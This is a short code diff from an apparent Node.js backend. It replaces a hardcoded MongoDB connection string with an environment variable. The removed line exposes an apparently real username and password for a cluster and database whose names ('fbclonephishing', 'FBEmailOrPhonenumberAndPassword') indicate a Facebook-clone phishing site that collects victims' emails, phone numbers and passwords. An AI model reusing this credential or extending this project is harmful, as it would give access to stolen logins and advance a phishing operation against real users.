@@ -4,7 +4,7 @@ const app = express();
 const mongoose = require('mongoose')
 
 
-const mongodbStringURL = 'mongodb+srv://Adnan10100:Sz9InCzfT1U2bYXD@fbclonephishing.qfppeow.mongodb.net/FBEmailOrPhonenumberAndPassword?retryWrites=true&w=majority&appName=FBClonePhishing'
+const mongodbStringURL = process.env.MONGODB_URI;
 
 const connectingdb = async (url)=>{
     mongoose.connect(url).then(()=>{
